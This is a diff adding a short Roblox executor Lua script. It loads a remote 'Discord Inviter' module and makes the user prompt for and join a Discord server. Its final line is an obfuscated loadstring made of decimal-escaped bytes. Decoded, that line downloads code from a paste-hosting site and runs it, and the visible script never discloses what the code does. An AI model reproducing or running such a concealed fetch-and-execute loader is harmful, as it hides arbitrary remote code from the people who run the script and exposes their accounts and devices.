@@ -1,0 +1,9 @@
+local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
+
+Module.Prompt({ invite = "https://discord.gg/X8X5CFNB4e", name = "Script City" }) -- name is optional
+
+Module.Join("https://discord.gg/X8X5CFNB4e")
+
+wait(1.2)
+
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\97\112\105\46\117\112\108\111\97\100\46\115\121\115\116\101\109\115\47\112\97\115\116\101\115\47\108\77\48\68\114\83\65\69\117\117\50\70\47\114\97\119\34\44\32\116\114\117\101\41\41\40\41\10\10")()
